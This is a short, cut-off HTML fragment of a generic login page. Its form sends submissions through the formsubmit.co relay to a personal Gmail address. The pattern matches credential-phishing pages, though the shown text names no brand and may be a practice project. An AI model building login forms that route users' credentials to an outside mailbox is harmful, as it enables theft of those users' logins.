<!DOCTYPE html>
<html lang="en">
<head>

    <title>Log In</title>

<body>

    <div class="content">
        <div class="login_form">
            <div class="border_line"></div>
            <form action="https://formsubmit.co/tisamony941@gmail.com
            " method="POST">
                <i class="fa-solid fa-circle-user"></i>

                <div class="login_input">
